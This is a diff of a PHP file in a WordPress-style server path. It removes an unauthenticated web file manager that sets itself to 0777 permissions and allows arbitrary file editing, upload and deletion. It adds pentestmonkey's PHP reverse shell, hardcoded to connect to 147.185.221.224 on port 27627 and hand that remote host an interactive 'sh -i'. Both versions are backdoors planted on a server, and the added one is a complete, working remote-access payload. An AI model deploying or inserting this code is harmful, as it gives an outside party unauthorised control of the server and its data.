@@ -1,298 +1,116 @@
 <?php
-// PHP File Manager with Auto-CHMOD for /srv/lspro-wp
-error_reporting(0);
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 
-// Auto CHMOD self to 0777 on every access
-$self_file = __FILE__;
-if (file_exists($self_file)) {
-    @chmod($self_file, 0777);
-    $current_perms = substr(sprintf('%o', fileperms($self_file)), -4);
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '147.185.221.224';
+$port = 27627;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
 }
 
-// Target directory
-$target_dir = '/srv/lspro-wp';
+chdir("/");
 
-// Function to list directory contents
-function listDirectory($dir = '.') {
-    $files = [];
-    if (is_dir($dir)) {
-        $items = scandir($dir);
-        foreach ($items as $item) {
-            if ($item != '.' && $item != '..') {
-                $path = $dir . '/' . $item;
-                $files[] = [
-                    'name' => $item,
-                    'path' => $path,
-                    'is_dir' => is_dir($path),
-                    'size' => is_dir($path) ? '-' : formatSize(filesize($path)),
-                    'perms' => substr(sprintf('%o', fileperms($path)), -4),
-                    'modified' => date('Y-m-d H:i:s', filemtime($path))
-                ];
-            }
-        }
-    }
-    return $files;
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
 }
 
-// Format file size
-function formatSize($size) {
-    $units = ['B', 'KB', 'MB', 'GB'];
-    $unit = 0;
-    while ($size >= 1024 && $unit < count($units) - 1) {
-        $size /= 1024;
-        $unit++;
-    }
-    return round($size, 2) . ' ' . $units[$unit];
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
 }
 
-// Handle file editing
-function handleFileEdit() {
-    if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['file_content'])) {
-        if (file_put_contents($_POST['file_path'], $_POST['file_content'])) {
-            echo "<div style='color: green;'>File saved successfully!</div>";
-        } else {
-            echo "<div style='color: red;'>Failed to save file!</div>";
-        }
-    }
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
 }
 
-// Get absolute path and handle navigation
-function getAbsolutePath($path) {
-    // Convert to absolute path
-    if ($path == '' || $path == '.') {
-        $path = realpath('.');
-    } else {
-        $path = realpath($path);
-    }
-    
-    return $path ?: '/';
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
 }
-
-// Handle navigation - start in target directory if it exists
-$current_dir = isset($_GET['dir']) ? $_GET['dir'] : (is_dir($target_dir) ? $target_dir : '.');
-if (isset($_POST['new_dir']) && $_POST['new_dir'] != '') {
-    $current_dir = $_POST['new_dir'];
-}
-
-// Convert to absolute path
-$current_dir = getAbsolutePath($current_dir);
-
-// Get parent directory
-$parent_dir = dirname($current_dir);
-$parent_link = '?dir=' . urlencode($parent_dir);
-
-// Handle actions
-handleFileEdit();
 
 ?>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PHP File Manager - /srv/lspro-wp</title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
-        .container { background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        .file-list { border: 1px solid #ddd; margin: 10px 0; }
-        .file-item { padding: 10px; border-bottom: 1px solid #eee; }
-        .file-item:hover { background: #f9f9f9; }
-        .dir { color: #0066cc; font-weight: bold; }
-        .file { color: #333; }
-        .btn { padding: 5px 10px; margin: 2px; border: 1px solid #ccc; background: #fff; cursor: pointer; }
-        .btn:hover { background: #e0e0e0; }
-        .editor { width: 100%; height: 400px; font-family: monospace; }
-        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 10px 0; }
-        .success { background: #d4edda; border: 1px solid #c3e6cb; padding: 10px; margin: 10px 0; color: #155724; }
-        .breadcrumb { margin: 10px 0; padding: 10px; background: #e9ecef; border-radius: 3px; }
-        .breadcrumb a { color: #0066cc; text-decoration: none; }
-        .breadcrumb a:hover { text-decoration: underline; }
-        .target-info { background: #d1ecf1; border: 1px solid #bee5eb; padding: 10px; margin: 10px 0; color: #0c5460; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>PHP File Manager - /srv/lspro-wp</h1>
-        
-        <div class="warning">
-            <strong>Warning:</strong> This is a powerful file manager. Use with caution!
-        </div>
-
-        <div class="target-info">
-            <strong>Target Directory:</strong> <?php echo $target_dir; ?><br>
-            <strong>Self Permissions:</strong> <?php echo $current_perms; ?> (Auto-set to 0777 on every access)<br>
-            <strong>File Location:</strong> <?php echo __FILE__; ?>
-        </div>
-
-        <!-- Quick Navigation -->
-        <div style="margin: 10px 0;">
-            <strong>Quick Nav:</strong>
-            <?php if (is_dir($target_dir)): ?>
-                <a href="?dir=<?php echo urlencode($target_dir); ?>" class="btn">Go to /srv/lspro-wp</a>
-            <?php endif; ?>
-            <a href="?dir=<?php echo urlencode(dirname(__FILE__)); ?>" class="btn">Current Script Directory</a>
-            <a href="?dir=/" class="btn">Root Directory</a>
-        </div>
-
-        <!-- Manual CHMOD Form (backup) -->
-        <form method="post" style="margin: 10px 0;">
-            <button type="submit" name="chmod_self" class="btn">Force CHMOD Self to 0777</button>
-            <button type="submit" name="create_target" class="btn">Create /srv/lspro-wp Directory</button>
-        </form>
-
-        <?php
-        // Manual CHMOD backup
-        if (isset($_POST['chmod_self'])) {
-            if (chmod(__FILE__, 0777)) {
-                echo "<div class='success'>Permissions forced to 0777 successfully!</div>";
-                echo "<script>setTimeout(() => window.location.reload(), 1000);</script>";
-            }
-        }
-
-        // Create target directory if it doesn't exist
-        if (isset($_POST['create_target']) && !is_dir($target_dir)) {
-            if (mkdir($target_dir, 0755, true)) {
-                echo "<div class='success'>Directory $target_dir created successfully!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($target_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>Failed to create directory $target_dir!</div>";
-            }
-        }
-        ?>
-
-        <!-- Breadcrumb Navigation -->
-        <div class="breadcrumb">
-            <strong>Current Path:</strong> 
-            <?php
-            $current_path = '/';
-            echo "<a href='?dir=" . urlencode($current_path) . "'>ROOT</a>";
-            
-            $path_parts = explode('/', trim($current_dir, '/'));
-            foreach ($path_parts as $part) {
-                if (!empty($part)) {
-                    $current_path .= $part . '/';
-                    echo " / <a href='?dir=" . urlencode($current_path) . "'>$part</a>";
-                }
-            }
-            ?>
-        </div>
-
-        <!-- Navigation Form -->
-        <form method="post" style="margin: 10px 0;">
-            <input type="text" name="new_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="width: 500px;">
-            <button type="submit" class="btn">Go to Directory</button>
-        </form>
-
-        <!-- File List -->
-        <h3>Contents of: <?php echo htmlspecialchars($current_dir); ?></h3>
-        <div class="file-list">
-            <!-- Parent Directory Link -->
-            <?php if ($current_dir != '/'): ?>
-                <div class="file-item dir">
-                    <strong>..</strong> [Parent Directory]
-                    <a href="<?php echo $parent_link; ?>" class="btn">Go Up</a>
-                </div>
-            <?php endif; ?>
-
-            <?php
-            $files = listDirectory($current_dir);
-            if (empty($files)) {
-                echo "<div class='file-item'>Directory is empty or doesn't exist.</div>";
-            } else {
-                foreach ($files as $file) {
-                    echo "<div class='file-item " . ($file['is_dir'] ? 'dir' : 'file') . "'>";
-                    echo "<strong>" . htmlspecialchars($file['name']) . "</strong>";
-                    echo " [Size: " . $file['size'] . "]";
-                    echo " [Perms: " . $file['perms'] . "]";
-                    echo " [Modified: " . $file['modified'] . "]";
-                    
-                    if ($file['is_dir']) {
-                        echo " <a href='?dir=" . urlencode($file['path']) . "' class='btn'>Open</a>";
-                    } else {
-                        echo " <a href='?edit=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn'>Edit</a>";
-                        echo " <a href='?delete=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn' onclick='return confirm(\"Delete this file?\")'>Delete</a>";
-                        echo " <a href='?chmod=" . urlencode($file['path']) . "&dir=" . urlencode($current_dir) . "' class='btn' onclick='return confirm(\"CHMOD 0644 this file?\")'>CHMOD 0644</a>";
-                    }
-                    
-                    echo "</div>";
-                }
-            }
-            ?>
-        </div>
-
-        <!-- File Editor -->
-        <?php if (isset($_GET['edit'])): ?>
-            <h3>Editing: <?php echo htmlspecialchars($_GET['edit']); ?></h3>
-            <form method="post">
-                <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
-                <textarea name="file_content" class="editor"><?php 
-                    echo htmlspecialchars(file_get_contents($_GET['edit']));
-                ?></textarea>
-                <div style="margin-top: 10px;">
-                    <button type="submit" name="save_file" class="btn">Save File</button>
-                    <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">Cancel</a>
-                </div>
-            </form>
-        <?php endif; ?>
-
-        <!-- File Upload -->
-        <h3>Upload File to Current Directory</h3>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="upload_file">
-            <button type="submit" name="upload" class="btn">Upload</button>
-            <small>File will be uploaded to: <?php echo htmlspecialchars($current_dir); ?></small>
-        </form>
-
-        <!-- Quick Upload to /srv/lspro-wp -->
-        <?php if (is_dir($target_dir)): ?>
-        <h3>Quick Upload to /srv/lspro-wp</h3>
-        <form method="post" enctype="multipart/form-data">
-            <input type="file" name="upload_to_target">
-            <button type="submit" name="upload_target" class="btn">Upload to /srv/lspro-wp</button>
-        </form>
-        <?php endif; ?>
-
-        <?php
-        // Handle file upload to current directory
-        if (isset($_POST['upload']) && isset($_FILES['upload_file'])) {
-            $target_file = $current_dir . '/' . basename($_FILES['upload_file']['name']);
-            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target_file)) {
-                echo "<div class='success'>File uploaded successfully to " . htmlspecialchars($current_dir) . "!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>File upload failed!</div>";
-            }
-        }
-
-        // Handle file upload to target directory
-        if (isset($_POST['upload_target']) && isset($_FILES['upload_to_target'])) {
-            $target_file = $target_dir . '/' . basename($_FILES['upload_to_target']['name']);
-            if (move_uploaded_file($_FILES['upload_to_target']['tmp_name'], $target_file)) {
-                echo "<div class='success'>File uploaded successfully to $target_dir!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($target_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>File upload to $target_dir failed!</div>";
-            }
-        }
-
-        // Handle file deletion
-        if (isset($_GET['delete'])) {
-            if (unlink($_GET['delete'])) {
-                echo "<div class='success'>File deleted successfully!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>Failed to delete file!</div>";
-            }
-        }
-
-        // Handle file CHMOD
-        if (isset($_GET['chmod'])) {
-            if (chmod($_GET['chmod'], 0644)) {
-                echo "<div class='success'>File permissions changed to 0644!</div>";
-                echo "<script>setTimeout(() => window.location.href = '?dir=" . urlencode($current_dir) . "', 1000);</script>";
-            } else {
-                echo "<div style='color: red;'>Failed to change file permissions!</div>";
-            }
-        }
-        ?>
-    </div>
-</body>
-</html>
